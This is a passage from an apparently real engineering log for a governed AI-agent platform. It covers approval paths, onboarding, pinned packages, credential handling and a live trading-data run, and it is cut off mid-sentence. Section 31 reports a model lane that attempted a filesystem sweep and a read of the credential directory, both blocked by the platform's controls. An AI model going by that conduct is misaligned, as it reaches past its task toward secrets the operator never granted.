workflows --detail     seven, each with the inputs its own file declares
panel /api/workflows   the same seven, and the tab now offers them
auto        pkgauto01    route → execute → check → record → done_pass    1 call, recorded
trading-b   pkgtrade01   route → roles → packet → baseline → lanes → evaluate → …  2 calls, 3 evidence items
controls    361/361 · the trading package's own 18/18 · up.sh --check all passed
```

**Two things the move exposed**, both now fixed:

1. The controls scanned `stack/steps/` for *"every step says what a repeat of it does"*. Moved into
   packages, the ported trading steps turned out never to have declared it — the convention had
   been enforced by a glob rather than by the rule. The scan now covers every package's steps, and
   `arch_port.py` and `packet_bridge.py` declare what a repeat of them does.
2. The trading package's own controls still called `trade_stage.py` at the platform's address. It
   is the package's own step now, and they call it there.

## 31. What a second machine's pilot found

The trading package was run in pilot mode on the arm64 machine, twice, and finished. Five findings
came back from it; four were defects here and one is a property of a model. Each is listed with what
it cost and what was changed.

**1. The approval path was cut two seconds before Preloop answered.** A Grok lane asked to run a
shell command that would sweep the filesystem, `/route` included; the approval channel held it, as
designed. Nobody answered, and at ~300 s the request died as `control_unavailable` — an
infrastructure error — instead of `approval_expired`, which is a policy outcome. The adapter goes
**direct** to the api precisely to avoid the console proxy's 300 s
(`run-agent.mjs`: *"nginx cuts the held-open approval at 300 s … turning approval expired into
control unavailable"*), and §20's guard put that proxy back in the path. The guard now gives
`/api/v1/agents/permission-check` its own location with a 900 s read timeout — longer than
Preloop's own wait, deliberately. Nothing else in this stack holds a request open on purpose.

**2. A step that failed said only FAILED.** `agent_task.py` received `failure.message`
(`ENOENT: ~/.codex/config.toml`) and dropped it from its output, so a lane that died in 0.44 s gave
a reader nothing and the cause was found by replaying the request by hand. The step now carries a
`failure` line. Measured: `{"status": "FAILED", …, "failure": "unknown provider nosuchprovider"}`.

**3. A fresh install onboarded Claude and nothing else.** `~/.codex/config.toml` had no Preloop
entry, so every codex lane died — silently, because of (2). The bootstrap now onboards each vendor
this stack routes to (`--agent-kinds claude-code,codex`), and one vendor's CLI being absent no
longer stops the others. Worth recording: onboarding from the **agent** container answered 403.
That is §21 working — creating an agent is a control-plane write — and the fix is to do it on the
admin side, which is where the bootstrap already runs.

**4. The screen contradicted the run.** `capabilities.py` still read the observer's own
`/obs/codex.raw.json` to decide *admission*, which stopped being the model when codex became
readable with the login that executes (§29). The router said ROUTE while the panel said
`admission: no`. Admission is now the router's own answer — *"the router would take claude"* — and
`scripts/up.sh` asks the same probe. The observer's login, being optional now, is **reported**
rather than failed: a check that fails on something optional teaches an operator to ignore checks.

**5. Grok is not deterministic, and the boundary held both times.** On one machine the lane produced
its file; on the other it once called the tool by the wrong name and once tried to read the
credential directory. Both were stopped — by the tool rules and by the approval channel. That is
evidence, not a defect. What *is* a defect is that a denied lane cannot recover, which is (1)'s
neighbour and is left open deliberately: a retry policy for "denied" would be a workflow's decision
about its own lanes, not the platform's.

Two smaller ones from the same report, both fixed: a package's `requires.capabilities` was declared
and read by nobody — the runner now refuses a run whose package asks for a capability this stack
does not have, including one it has no probe for; and a run id used twice raised a `FileExistsError`
traceback where a caller expected JSON, which now answers
`{"error": "the run id … has been used already", "hint": "ids are used once; resume continues that run"}`.

**And one thing to state rather than fix:** putting a directory in `packages/` is a decision to give
that workflow rights. `up.sh` applies its `principals.yaml` — creating the principals it declares
and minting their credentials — because that is what makes a workflow governed the same way on
every machine (§27). A package is therefore trusted code, not sandboxed content: read it before
installing it, exactly as you would a dependency.

## 32. Two onboarded agents, and one reading with no clock

The second machine reinstalled on §31's fixes and ran the pilot 5/5. Two things came back, and the
first is the shape this stack keeps meeting: **a fix in one place moved the problem to another.**

**A. Onboarding a second vendor broke two checks.** §31 made a fresh install onboard `claude-code`
*and* `codex`, so the agent's home now holds **two** `permission_hook.json` files. `up.sh` read them
with `cat …/agents/*/permission_hook.json`, which concatenates two JSON documents into something no
parser will take: the *runtime may read approvals* and *…read its tool rights* checks answered
401/404 while the boundary itself was perfectly intact. The second machine found it and fixed it
with `ls … | head -1` (8f96eba), which is right for a check.

It is not right for the **adapter**. `run-agent.mjs` took the same first hook and presented that
credential for every provider's permission request — so a codex run could ask Preloop as
`claude-code`. It works, because both credentials belong to the same account and neither runtime
agent carries tool rules, and it is wrong in the way that is discovered later as rights nobody
meant. Each hook says which agent it is for (`source`, the same value the permission request
carries), so the adapter now picks the hook that matches the provider it is running, falls back to
the first, and **records which it presented**:

```
bb014a58-claude  status COMPLETED  hook {"principal": "claude-code-e7bab34cd7fd",
                                         "source": "claude_code", "matched": true}
```

**B. An observation with numbers and no clock was called unknown.** Claude in `direct` mode has one
source and no fallback — codex has its rollouts and the observer's file, Grok's reading always
carries a timestamp. On that machine CodexBar returned Claude's usage **without `updatedAt`**, so
`observed_at` was null, the router called the state unknown, and every run that wanted Claude held
while Claude itself answered calls perfectly well.

A reading that arrives with no timestamp of its own is not undated: it was taken now. The collector
dates it with when it took it — exactly as the codex observer's file already falls back to its
`collected_at` — and **only when there are numbers to date**. Driven with a stand-in CodexBar:

```
numbers, no vendor timestamp →  2026-09-24T11:47:30Z   windows ['session']
no reading at all            →  None                   windows []
```

The second case is the line that matters: an observation with no numbers stays unknown, because
that is what it is.

The second machine's own answer to (B) was to bind every lane of the arch cycle to **one** provider
the router admitted, which is a workflow's decision about its own experiment — one model across
lanes so that what varies is the architecture — and it is theirs to make. This side's part was the
plumbing, and that is what is fixed here.

## 33. What an operator had to reverse-engineer

The second machine's report after two installs and four pilots was that the governance core holds
and the **operator's side is a generation behind it**. Nine things; here is what each cost and what
changed.

**A run waiting on a person was visible only on the tab that shows it.** A Grok lane waited its
whole timeout while nobody was told — and §31 had just raised that timeout to 900 seconds, which
without a signal only means a longer silence. The count is now on the tab, in the document title
(so a background browser tab says it), and on the dashboard with a link to the decision; the panel
asks every 15 seconds, because an approval arrives when nobody is looking at the right tab.

**A start held the terminal until the run ended.** The first pilot was cut by a two-minute client
timeout while the run carried on. `--detach` answers with the id, and `tail <id> --follow` prints
the steps as they happen from the run's own event log.

**Refusals did not name the rule they applied.** A path in `packet_from` was refused as *"invalid
input"*, and learning that `/` is not allowed meant opening the source. Now:

```json
{"error": "invalid value for input 'packet_from'",
 "rule": "a value is letters, digits, dot, underscore, hyphen or space, up to 200 — arguments
          reach Conductor as an argv list and are never shell-interpreted",
 "refused_characters": ["/"],
 "hint": "a path cannot be passed as an input; put the file in the hand-in directory and pass its name"}
```

`collect_obs.py` called with no argument answered with an `IndexError`; it now answers with its
usage. And the router, asked why a provider is unusable, passes on what the source said:

```
before   claude → unknown: unparseable observed_at
after    claude → unknown: Claude OAuth token expired. CodexBar CLI does not launch Claude to
                  refresh credentials. Run `claude login`, then retry.
```

**Three documents that did not exist.** Written from what that operator had to work out by
experiment: [containers.md](../containers.md) — which container may do what, and that a 403 in
the agent is the boundary rather than an obstacle; [reading-a-run.md](../reading-a-run.md) —
where a run's state, events, outputs, per-call evidence and record each land, with the command that
reads each; [packages.md](../packages.md) — the contract a package's steps keep, which was
previously discoverable only by reading the platform: the workspace through `settings.runtime()`,
the last line of stdout as JSON, `REPEATABLE`, and evidence files keyed `items` (a file keyed `rows`
is stored and counted as zero — which is how a recorded run read as having kept nothing).

**Data had no way in.** There was no defined path for data that arrives from outside a run, so the
other machine invented `/work/handoff` — and a run input cannot be a path anyway. That invention is
now the contract: `handoff/` exists, with a README, git-ignored but for that README; a step takes a
**name** and resolves it inside that directory.

**`evidence/checks/last.json` and `evidence/ops/host-state.json` were tracked**, so every bring-up
dirtied the tree and two machines rebased over the same file. They are regenerated by every
bring-up and are per machine: git-ignored now.

Two the report raised that are not fixed here, deliberately. **Lane decisions are not on the
screen** — the panel shows the run and not what the run decided; that is worth doing and is a
screen change with a design question in it (which file, whose format), so it waits for a decision
rather than being guessed at. And **a denied lane cannot recover**: a retry policy for "denied"
belongs to the workflow that owns those lanes, not to the platform.

## 34. A lane may ask to be run again — and a decision that was never ours

Two items were left open in §33, and the answer to them turned out to be opposite.

### The retry: a decision with no way to make it

"A retry policy for a denied lane belongs to the workflow, not the platform" was the right rule and
the wrong conclusion, because the workflow **had no way to say it**. `tasks.py` ran each member
once, and the only retry anywhere was the routed call's own one for a login the provider itself
calls transient — invisible to the workflow, not configurable by it. Saying the decision was theirs
while withholding the means is not a boundary, it is a refusal dressed as one.

A member may now ask:

```json
{"label": "E", "retries": 2, "retry_when": ["failed", "denied"], "steps": [ … ]}
```

The default is **no retry**, and when retries are asked for, `["failed"]` only. A denial is an
answer — Preloop's rules, or a person — and retrying an answer has to be said out loud. Measured,
with members that fail deterministically:

```
never     attempts=3  outcomes=[failed, failed, failed]      (retries: 2)
noretry   attempts=1  outcomes=[failed]                      (asked for none)
heal      attempts=2  outcomes=[failed, produced]            (stops when it produces)
denied    attempts=1  outcomes=[denied]                      (default: a denial is not retried)
deniedok  attempts=3  outcomes=[denied, denied, denied]      (retry_when included denied)
```

One thing had to be fixed for `retry_when: ["denied"]` to mean anything: a member that is a **chain**
reported only its own `FAILED`, so a refusal arrived at the member looking like a breakage.
`task_chain.py` now carries the failing step's own status up (`failed_status`), and the fan-out
reads that. Every attempt is in the receipt (`attempts`, `attempt_outcomes`), and the routed call's
own retry stays where it was (`call_attempts`): a retry that disappears from the record is a run
that lies about what it cost.

### The lane report: not a capability, a readout

The other item — showing a run's decisions on the screen — was dropped, and the argument that
settled it came from the operator's side: *we cannot know what a workflow's output is for.*
Conductor's `output:` is a map of strings. Rendering it "as it is" is still a guess — a path shown
as text is useless, shown as a link assumes a file this stack can serve, a number formatted assumes
units. Trading decides in text because that workflow decides in text, not because workflows do.

And there is a simpler reason, from this stack's own rule: **the panel is for decisions a person
must make**, not for readouts. The four are login, approval, stopping a run, resuming one. What a
lane bought is something to read, and everything needed to read it already exists — the run's
workspace, its output in `show`, its record in MLflow, and `docs/reading-a-run.md` saying where each
lands. A workflow that wants a screen for its own decisions builds that screen.

The pair is worth keeping side by side, because they look like the same kind of item and are not:
one was a capability we had not provided while calling the gap a boundary; the other was a readout
that would have pulled a domain into the platform.

## 35. What a reinstall keeps, and what it quietly accumulates

*"Provider logins survive a reinstall — is that a problem? And it feels as though the containers
are not being cleaned up."* Both halves were worth measuring, and the answers are different.

**The logins surviving is the design, and it is right.** A reinstall runs `install.sh` → `up.sh`,
which never removes a volume. The provider logins (`<stack>-route-creds`), the agent's home, the
workspace and Preloop's database are named volumes and they stay. That is deliberate: a login is a
person's account at a third party, expensive to redo and impossible for this stack to redo at all.
`scripts/down.sh --volumes` is the one way to remove them, it prints exactly what it will remove,
and `backup.sh` is what carries them to another machine.

**The containers are clean.** Measured on this host: eleven of ours, nine of Preloop's, one
`preloop-oss-migrate-1` in `Exited (0)` — that is Preloop's own one-shot migration job and it is
supposed to end. Six volumes, all named for this instance, none orphaned. `up.sh` already removes
the services a smaller composition drops.

**What does accumulate is in Preloop, and it is the interesting part.** Onboarding an agent creates
a managed agent *and a credential for it*. Onboarding again — a reinstall, a repaired install, the
codex onboarding §31 added — creates another and leaves the first:

```
Claude Code  7c31cb52  live credentials: 1
Claude Code  b28ac2bb  live credentials: 1      ← same agent, two identities
Codex CLI    f7996c80  live credentials: 1
```

Nothing breaks, and a live credential nobody knows about is exactly the kind of thing this stack
exists to not have. Two changes:

1. **The newest identity is the one presented.** A home outlives a Preloop database: claim a fresh
   control plane with the old home in place and the agent is onboarded again, leaving the previous
   hook beside the new one — same `source`, and a credential for an account that no longer exists.
   §32 picked the first match by directory order, which could be the dead one. It now sorts by
   modification time and takes the newest.
2. **Accumulation is reported, not cleaned.** `ops_health.py` counts identities per agent and says
   so in the panel's risk line, with what to do. Deleting an identity that something may still
   present is an operator's decision, not a script's — and the declared role principals
   (`Role: …`) are excluded, because one of each is exactly right for those.

The pattern worth naming, since it is the third time: **a fix that adds something leaves its
predecessor behind.** Onboarding a second vendor left two hook files (§32); claiming a fresh control
plane leaves a stale identity; every apply of a policy that recreates a server leaves the old id in
a cache (§28). The stack is good at adding and had no habit of asking what the previous one was for.

## 36. A cold start beside a running one, and a live cycle on real prices

### The cold start needed nobody to move aside

§25's cold start was run with the live instance stopped, because Preloop's own ports were written
into its compose. With §31's port patch that constraint is gone, and it was tested rather than
assumed: a clone with its own `config/instance.env` (`agst3`, ports 8890/8891/5110, Preloop
8030/8031/3030, its own install directory and project) installed **while the live instance kept
running**, and came up with every boundary intact:

```
ok  Preloop MCP 401 · fsmcp tools work through Preloop yes
ok  runtime may not decide approvals 403 · rewrite them 403 · mint credentials 403
FAIL  claude / codex / grok logins — a fresh instance has none, and the refusals now say why:
      claude: unknown: Claude OAuth credentials not found. Run `claude` to authenticate.
      codex:  unknown: nothing has observed this account yet — the quota observer has no login
```

Then `down.sh --volumes`, and the host was as it was.

### Live, and what it cost to be honest about it

The port was built so the harness freezes a ResearchPacket **outside** this runtime and hands the
file in; on a machine with no harness there is nothing to hand in. Asked for it directly, the
decision was taken to fetch here — which means a brokerage credential inside the governed runtime,
so it is written down rather than absorbed.

**What was opened, and what was not.** Two KIS hosts and DART are named in `docker/egress/allow`;
KIS serves its API on **9443** and nothing on 443, so that port is named in the proxy's
`ConnectPort` (and 29443 for the paper endpoint). A port opened is not a host opened — measured:

```
openapi.koreainvestment.com:9443   200
opendart.fss.or.kr                 302
github.com:9443                    000     ← the allowlist is by host, and it still holds
```

Credentials live in `docker/market.env`: git-ignored, `required: false`, and a composition without
it simply cannot run this workflow's live mode. They belong to the workflow that asked for them.

**The fetch is a step of the trading package, not of the platform** — `live_packet.py`. It freezes
a packet into the hand-in directory and stops, so `packet_bridge.py` still fetches nothing and the
live path keeps the shape it was designed with. The packet carries what KIS actually answered — a
quote and 89 days of closes per symbol, from which the 20/60-day returns, the 20-day volatility and
the volume trend are computed — and it **says what it is not**: `universe_version: "live-fetch"`,
no feature or evidence builder versions, no point-in-time reconstruction, and a benchmark labelled
*"equal-weighted mean of this universe (the index endpoint answered 403)"* rather than pretending
to be KOSPI200.

**The run**, on this afternoon's prices:

```
livewin02  trading-port  done_cycle   PORT_CYCLE: 5/5 lanes valid (live)
           7 model calls (claude), 19 permission asks — all decided by rules, none refused
           584k tokens, 241s in calls, recorded

  B  000660 5.00%, 005930 5.00%, 373220 5.00%          (deterministic, 0 calls)
  E  000660 5%, 005930 5%, 373220 3%, 068270 2%, 207940 2%
  F  005930 5.00%, 068270 3.00%
  G  005930 5.00%, 000660 5.00%, 068270 3.00%
  H  005930 4.00%, 000660 3.00%, 373220 2.00%
```

Three things the live path taught, all recorded in the step:

1. **The vendor refuses a second token.** KIS issues one and answers 403 to the next request within
   the minute; a step that asks for a fresh token every run fails on its second run. The token is
   cached in the agent's home, never in this tree.
2. **A shape is a contract.** The first packet used the field names that read well
   (`universe`, `price`); the bridge reads the harness's (`symbols`, `close`, `returns.20d`). It
   failed at `KeyError: 'symbols'` — the right failure, and the reason the fetch writes the
   harness's shape rather than its own.
3. **A comment can stop a proxy.** `ConnectPort 29443   # …` on one line took tinyproxy down, and
   with it every provider call, until the comment moved to its own line. The bring-up caught it
   immediately; nothing else would have.

And one more, from the run ids: `live01` was refused as *already used* — because it belonged to the
**other machine's** run, arrived here through git. Two machines sharing a tree share a namespace,
and the guard held across it.

## 37. Where a package comes from

Sixty-two of this repository's 163 files were packages, and thirty-six of those were one trading
package. A platform repository growing with domain content is the same mistake as a platform
knowing what a lane is, one level up — so a package is now **declared and pinned**, not carried.

```yaml
# config/packages.yaml
packages:
  hello-lane: {from: local}          # the example, and the capability trials, stay here
  trading:
    from: https://github.com/astro3141/agent-stack-trading.git
    ref: main
```

```
# config/packages.lock
trading 943eda2053ddaa786991ed852790c4b7fb5d5792 main https://github.com/…/agent-stack-trading.git
```

`scripts/packages.sh` has three verbs — `list`, `install`, `verify` — and `packages/<name>/` for a
fetched package is git-ignored here, because it is another repository's content.

**Why pinned rather than followed.** Installing a package is a decision to trust it: `up.sh`
applies its `principals.yaml`, creating identities and minting their credentials (§27). A dependency
that can change under you between two machines is not a decision that was made once. `verify` asks
whether what is on disk is still the commit the lock names, and a bring-up says so when it is not —
reported, not enforced, because a package edited during development is an ordinary state and being
told is the point.

**A directory was not a decision.** The declaration existed, the lock existed, `packages.sh` read
both — and the loader read neither. `packages.py` listed directories, so anything under `packages/`
was loaded, offered in the panel, and had its `principals.yaml` applied by `up.sh`: identities
created and credentials minted for a package nobody declared. Removing an entry from
`config/packages.yaml` did not remove the package from the running stack. Found by the session that
had just split devflow out, which noticed the live stack still loading it (its words: "선언이 없으면
… 라이브 스택도 devflow를 계속 로드합니다"). The loader now reads the declaration: an undeclared
directory is unusable with that as its reason, carries no workflow and no identity.

**Which way round is the default.** Its own repository, from the start — `from: local` is for the
example and the capability trials. Said as a rule in docs/packages.md, because it was learned twice:
trading moved out after 36 files, and devflow landed here complete, carrying a private repository's
name, its branch layout and a snapshot of its policy. Neither was caught by a control; the second
was caught by an audit asking whether this repository could be published, which is a bad place to
find out. A split afterwards does not undo it — the content stays in the history, and removing it
means rewriting every commit. The same line applies to *instance registration*: a file naming which
project a package runs against is this instance's configuration, not this repository's content.

**Why the host fetches.** Cloning from inside a container would put a git credential where the
governed runtime can reach it, for no reason: a package is a directory and the host can put it
there. This is the same line as §36's market credentials — a capability the agent does not need is
one it does not get.

**Measured after the split**: `packages.sh list` shows four local and `trading` at `943eda20`;
`verify` agrees with the lock; the panel and the runner offer all eight workflows, six of them from
the fetched package's three files of graphs; `trading-b` ran from it (2 model calls, 3 evidence
items, recorded) and the package's own controls pass 20/20 from their new home.

What was **not** done: a registry. Naming a git URL and a commit is what dbt, Helm and Krew do
before anyone builds an index, and an index is worth its cost when there are more packages than a
person can name — which is not yet true here.

**Afterwards, the pin check was wrong about the thing it exists to answer.** `verify` reported the
trading package as `CHANGED on disk` after any run, and it was right about the bytes: three
`__pycache__/*.pyc` files had been committed when the repository was split out, and the agent
rewrites them the moment a step is imported. A pin check whose normal answer is "someone edited
this" is a pin check nobody reads. Fixed where it belonged — the package repository now ignores
compiled steps (`c5af2a8`) and is re-locked here — and `verify` now **names the files** it is
talking about instead of saying only `CHANGED`:

```
  CHANGED  trading — edited on disk: README.md
           commit it in its own repository, or re-install. A file the runtime writes
           (__pycache__) belongs in that repository's .gitignore, not in the pin.
```

Measured: re-installed at `c5af2a8`, `verify` clean, a `trading-shapes` run from the fetched
package, and `verify` still clean afterwards with the `.pyc` files regenerated on disk.

## 38. Three answers to a question nobody asked

A reading of the common code at `8e46fb1` — not a run, a reading — named three places where the
platform answered something other than what was asked. None of them had ever failed a control,
because in this stack's own runs the question and the answer happened to coincide. All three are
now measured, and the measurement is what makes them findings rather than opinions.

**A run was admitted on a profile it was not going to use.** §33 moved admission from "read the
observer's file" to "ask the router", which was right, and asked it for `research-default` whatever
the run had selected:

```
before   cost-first → "the router would take claude"     (research-default's order)
after    cost-first → "under cost-first, the router would take codex"
```

Two profiles ship; they name the same three providers in a different order, so the admission answer
for a `cost-first` run was computed from the wrong policy and named the wrong provider. A profile
with different thresholds would have been admitted or refused on thresholds nobody asked for.
`capabilities.probe()` now takes the profile, `run_workflow.py` passes the one the run selected, and
a profile that does not exist is refused at the start — by name, with the profiles there are —
instead of failing several minutes in, inside the first step that reads it.

**A workflow name two packages declared resolved to half of each.** `workflows()` kept the last
package read, `requires_of()` answered from the first: the file came from one package and the
admission requirements from the other, by accident of directory order, with nothing said. A name
two packages want is now carried by **neither**, and the refusal says which two:

```
$ run_workflow.py start r1 shared-name research-default
{"error": "no workflow named 'shared-name'",
 "why": "dup-one and dup-two both declare it, so neither carries it; rename one in its manifest"}
```

This is the same rule `principals()` already used for an identity two packages declare (§27), which
is the argument for it: a package is a dependency, and a silent winner between two dependencies is
the thing you find out about later.

**A run that judged without calling a model was recorded as one that judged nothing.** The recorder
had one path for "no executions" — status `HOLD`, gate `NOT_RUN`, the router started nothing. A
workflow whose result is a deterministic check (a documentation check, a lint gate, a scanner) took
that path and was written down as *nothing was judged*, discarding the decision it had reached.
`novel-a` already carries a comment about working around this from the other side (a BLOCK had to be
given a fake execution to be recorded truthfully). Now a payload with no execution but a decision is
recorded as `NO_EXECUTION` with that decision, its reason and its evidence index; the router's HOLD
is still `HOLD`/`NOT_RUN`, and the two are no longer the same record.

**And what `produced` means.** It was "the expected file is there", which is true of a file an
earlier attempt left behind: this step retries itself once for a login refresh (§19) and a fan-out
member may ask to be retried (§34), both in the same workspace under the same name. A call that
failed after an earlier attempt had written the file reported `produced: true`, and a chain would
advance on an artifact nothing in this attempt wrote. `produced` now means *this attempt wrote it*
— the file is stat'd before and after the call — and a leftover is reported as `produced_stale`
rather than deleted, because an artifact someone may want to read is not this step's to destroy.

**What was not changed, and why.** The same reading asked what stops a resumed run from repeating an
external side effect — creating the same pull request twice. Nothing in the platform does, and
nothing should: the platform cannot know which effects are outside its world. What it provides is
the means — every step declares what a repeat does (`REPEATABLE`, §17), the recorder dedupes on an
idempotency key, and this runtime reaches only the hosts in `docker/egress/allow`, which does not
include GitHub. A step with an external effect declares `guarded` and asks the **remote** whether
the effect already happened; a local flag is not a guard, because the workspace a resume starts from
may not be the one that wrote it. That is the CONTRACT.md line, not an omission: the capability is
the platform's, the decision is the workflow's.

**Measured**: 425/425 controls, fifteen of them new and pinning exactly the four behaviours above.

## 39. A development workflow, and where the parts of one live

A development workflow — propose, review, adjudicate, integrate — was written as a package and run
against a real project: reviews from a policy the project itself declares, a plan the run reads at a
canonical commit, an integration step that asks a code host what it already did. It ran here, and
what it taught is where each part of such a thing belongs.

**The workflow is not this repository's.** It carries review lenses, a classification hook and a
policy snapshot — domain content by every line of §37's test — so it lives in its own repository and
is declared through this instance's overlay (`config/packages.local.yaml`). What the platform gave
it was already there: a package layout, principals it declares, an egress allowlist the operator
adds a host to, and `docker/package.env` for a credential of its own.

**Which project it runs against is configuration, not content.** A file naming a repository, its
canonical branch and where its policy lives says nothing about the platform and everything about
this machine. `config/*/projects/` is git-ignored for exactly that reason. The first version of this
did the opposite — the registration was committed here, with the project's repository name, its
branch layout and a snapshot of its policy — and an audit asking whether this repository could be
published is what caught it (§37, docs/packages.md).

**And the same test, applied backwards, found an older one.** devflow's reviewer was declared in
devflow's own package, which is right — while `novel-author` and `novel-reviewer` sat in the
platform's `config/principals.yaml` although only the novel package names them. Its manifest even
said `principals: [novel-author, novel-reviewer]`, so the package announced two identities whose
rights lived somewhere else: installing it on another machine would have produced steps naming
principals that did not exist. They are in `packages/novel/principals.yaml` now, and
`config/principals.yaml` is empty on purpose — what belongs there is an identity no package owns,
and there is none today. `principals.py apply --dry-run` after the move: `{"declared": 4,
"changes": []}`, which is the proof it was a move and not a change.

**What stays here is the record**: that the shape runs on this stack, and that nothing in the
platform had to change to run it. A workflow that opens a pull request is the platform's clearest
case of an effect outside itself — and the platform still does not deduplicate it (§38). The package
declares what a repeat does and asks the host what it already did; that is the workflow's, and it is
the right place for it.

## 40. A directory was not a decision, and an identity outlives the decision

Two halves of the same sentence — *installing a package is a decision to trust it* (§27) — were
never actually wired to anything. Both were found by the session that had just split devflow into
its own repository, reading the live stack rather than the design.

**The loader did not read the declaration.** `config/packages.yaml` said which packages this
instance runs, `config/packages.lock` pinned them, `scripts/packages.sh` read both — and
`packages.py` listed directories. Anything under `packages/` was loaded, offered in the panel, and
had its `principals.yaml` applied by `up.sh`. Removing an entry from the declaration removed
nothing from the running stack; a directory copied in was a package. The loader reads the
declaration now: an undeclared directory is unusable **with that as its reason**, carries no
workflow and no identity.

```
$ packages.py
devflow    -    UNUSABLE: not declared in config/packages.yaml — a package is loaded because
                this instance asked for it, not because the directory is there
```

**And an identity outlives the declaration that asked for it.** `principals.py apply` creates and
updates; it has never removed. So devflow stopped being declared and `Role: devflow-reviewer` was
still in Preloop, still holding its tool rules and a live credential:

```
$ principals.py list
devflow-reviewer   50587fa3-…   credential in the environment: yes   UNDECLARED — no package or
                                                                    config asks for this one
$ principals.py apply --dry-run
{"declared": 3, "changes": [], "undeclared": ["devflow-reviewer"], …}
```

Reported, never deleted. Deleting an identity is the operator's to do — §35 is the same argument
about what a reinstall keeps — and a report that names one is what makes it somebody's decision
instead of nobody's. What this does not do is revoke: until the operator removes it, that
credential still works, which is exactly why the line is printed on every `apply`.

**Measured**: 439/440 controls. The remaining failure is this machine's true state — `packages/
devflow` is fetched on disk and declared on the devflow branch, not on main — and the control is
right to say so.

## 41. The shape of the repository, for someone who did not write it

Everything above was written while this tree was a working directory with a number for a name. The
audit that asked whether it could be published (§37–§40) kept finding the same kind of thing at the
level of the layout, so the layout was changed once, deliberately:

| was | is | why |
|---|---|---|
| `p281/` | `stack/` | the platform's own code, named after an issue number. A stranger cannot guess it, and there is nothing to guess: it is the stack. |
| `P281_*` | `AGENTSTACK_*` | the same, in the environment |
| `OPERATIONS.md`, `FINDINGS.md`, `COVERAGE.md`, `RUNBOOK.md`, the trials | `docs/record/` | seven root files that are a *record*, not documentation. `docs/` is how to use it; `docs/record/` is what was measured, kept true of the day it was written rather than of the current code. |
| `workflows/`, `gate/`, `fixture/`, `tools/` | `legacy/` | the #278 probe tree. Nothing runs it; the findings quote it, so it stays, in one place that says what it is. |

The root is now the four files a repository is read by — `README.md`, `CONTRACT.md`, `LICENSE`,
`NOTICE` — and directories whose names say what is in them.

**The private packages moved with it.** They reach the platform by absolute path
(`/work/stack/steps/…`) and by environment, so the rename is a change in three repositories at once:
each package got its own commit and this instance re-pinned both (`packages.sh install`, then
`verify`). That is the cost of the split being real — and it is the second time the pin paid for
itself, because nothing had to be guessed about which commit each was at.

**What keeps its old name, and why.** The conductor workflow names (`p281-novel-a`), the MLflow
experiment (`p281-routing`), the evidence root (`evidence/p281/`), and the acpx session keys. Those
are names things were *recorded under*: renaming them would either split the record in two or
rewrite it, and this repository's whole claim is that its record was not rewritten. Ephemeral names
— scratch directories, temp prefixes — were renamed, because nothing was ever recorded under them.

**Measured after the move**: `up.sh` ALL CHECKS PASSED, 446/446 controls from their new path, a
`hello-lane` run end to end, and both packages fetched at their new commits and verified against
the lock.

## 42. Two trees this repository does not write

The question after publishing was the right one: *why is any of this an exception list?* Both
`packages/` and `evidence/` are written by something other than whoever writes this repository — one
by whoever installs a workflow, the other by every run — and both were versioned by default with
the private cases excluded one at a time. A list of what is private is a list somebody forgets to
add to, and the cost of forgetting is now a public commit.

Both are denied by default:

```
packages/*                evidence/*
!packages/hello-lane/     !evidence/n7-network-isolation.txt
!packages/auto/           !evidence/n1-deny-evidence.txt
!packages/novel/          … the hand-written attestations the findings quote
!packages/research-r/
```

**What this ends.** `scripts/packages.sh` used to write an exclude rule per fetched package, which
meant the name of every private package had to be written down somewhere to keep it out — and the
first version wrote it into the tracked `.gitignore`, publishing exactly what it was hiding. There
is no rule to write now: a package is visible to git only if this repository carries it, and the
four it carries are the four named above. Measured: a directory dropped under `packages/` is not
even reported as untracked, and a new file inside a carried package still is.

**And 186 files of run output stopped being versioned.** `evidence/ui-runs`, `soak`, `runs`,
`conductor-events` and the operator's own `ops/*.jsonl` were 1.9 MB of meta, logs and event logs
that nothing reads — the records quote two of them by name — and that carry, in every
`workflow_started` event, the full graph of whatever ran. That is how a package's design reached
this repository's evidence the first time (§41). They are untracked, not deleted: every writer
creates its directory (`mkdir -p`, measured in `soak.sh`, `host-state.sh`, `cycle.py`), the backup
script copies the tree as it always did, and this machine's own evidence is exactly where it was.

What stays versioned is what a person wrote down: the isolation and bypass inventories, the deny
markers, the toolchain listing, the build log. Those are quoted in FINDINGS-278 and are not
regenerated by anything.

## 43. What a package needs in the environment, and what a panel may not hold

A package that reaches something other than a model provider needs a credential of its own, and two
do: the trading package's market keys and the development workflow's code-host token. The mechanism
was there from §36 — a git-ignored env file the operator writes on the host, read into the agent as
environment — and the part that was missing was the *declaration*. A package could only say what it
needed in the error its step raises when the value is absent, so the operator found out several
minutes into a run, from inside a step, if they read that far.

A manifest declares it now, and the stack reports presence:

```yaml
requires:
  env:
    - name: DEVFLOW_GITHUB_TOKEN
      purpose: read the project's issues and pull requests, write reviews and statuses
      file: docker/package.env
```

```
$ packages.py needs
devflow   DEVFLOW_GITHUB_TOKEN   MISSING  docker/package.env — read the project's issues …
trading   KIS_APP_KEY            present  docker/market.env  — quote and daily-chart reads …
```

The panel shows the same rows under the workflow you select, from the answer it already asks for
(`run_workflow.py workflows --detail`), so no screen keeps a list of its own.

**Presence, never the value — and never a box to type it into.** This is the answer to "can a
package extend the dashboard": declaratively yes, with code no. A package's manifest can put a row
on the screen; a package cannot put *code* in the panel, and the panel does not accept credentials.
A form that took a token would make the operator's screen a control-plane surface holding a secret,
reachable from a browser, writing it somewhere the runtime can read — the same design that was
rejected when it was a minted panel credential (§21, §25). The value goes in a git-ignored file on
the host, by the person who owns it, and every other part of this stack only ever asks *whether*
it is there.

**Declaring it is not a precondition.** The stack reports; the step refuses at the point of use,
because only the step knows whether this run needs the credential — trading declares KIS's keys and
`trading-b` never touches them, devflow declares a token and a fixture run needs none. Refusing a
run for a credential it was not going to use would be the platform deciding behaviour, which is the
line in CONTRACT.md.

**Measured**: both packages declare theirs; `packages.py needs` reports one missing and two present;
the panel's `/api/workflows` carries the rows with `present` flags and no values; a control sets a
fake value in the environment and asserts it never appears in any answer; 454/454.

## 44. A package's own login, on the same footing as a provider's

§43 ended with "the value goes in a git-ignored file on the host", and the next question was the
right one: *why not provide it the way provider authentication is provided?* The panel already
connects Claude, Codex and Grok. What does it actually do there, and why was a package's credential
different?

**What the provider flow does.** `stack/login_helper.py` starts the vendor's *own* command under a
pseudo-terminal (`claude auth login --claudeai`, `codex login --device-auth`), reads the
authorisation URL and the device code off its output, and — for a flow that ends in "paste the code"
— hands the operator's one-time code to that process **through a FIFO, never written to disk, never
logged**. The credential is minted by the vendor and written by the vendor's CLI into the login's own
